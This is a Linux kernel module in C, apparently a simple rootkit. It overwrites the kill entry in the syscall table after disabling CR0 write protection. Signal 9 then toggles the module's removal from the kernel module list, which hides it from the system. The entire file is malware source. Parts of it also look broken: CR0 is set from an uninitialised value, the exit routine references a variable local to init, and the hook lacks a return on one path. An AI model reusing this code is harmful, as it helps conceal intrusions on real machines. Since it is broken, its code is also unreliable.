#include<linux/module.h>
#include "libs/ftrace_helper.h"

#define INV 9

static short hidden = 0;
static struct list_head *prev_module;

unsigned long *__sysc_table;
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_kill;

unsigned long *ret_sysc_table(void)
{
	__sysc_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
	return __sysc_table;
}

void hiderk(void)
{
	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	hidden=1;
}

void backrk(void)
{
	list_add(&THIS_MODULE->list, prev_module);
}

asmlinkage long (*orig_kill)(const struct pt_regs *regs);
asmlinkage int handler_kill(const struct pt_regs *regs)
{
	int sig=regs->si;
	switch(sig)
	{
		case INV:
		  if(hidden==0){hiderk();}
		  else{backrk();}
		  break;

		default:
		  return orig_kill(regs);

	}
}

unsigned long cr0;

static inline void def_cr0(unsigned long val)
{
	unsigned long __force_order;
	asm volatile(
			"mov %0, %%cr0"
			: "+r"(val), "+m"(__force_order));
}

static int __init rk_init(void)
{
  unsigned long *__sysc = ret_sysc_table();

  def_cr0(cr0 & ~0x0010000);

  orig_kill = (t_syscall)__sysc[__NR_kill];

  __sysc[__NR_kill] = (unsigned long)handler_kill;

  def_cr0(cr0);

  return 0;
}

static void __exit rk_destroy(void)
{
  def_cr0(cr0 & ~0x0010000);

  __sysc[__NR_kill] = (unsigned long)orig_kill;

  def_cr0(cr0);
}

module_init(rk_init);
module_exit(rk_destroy);
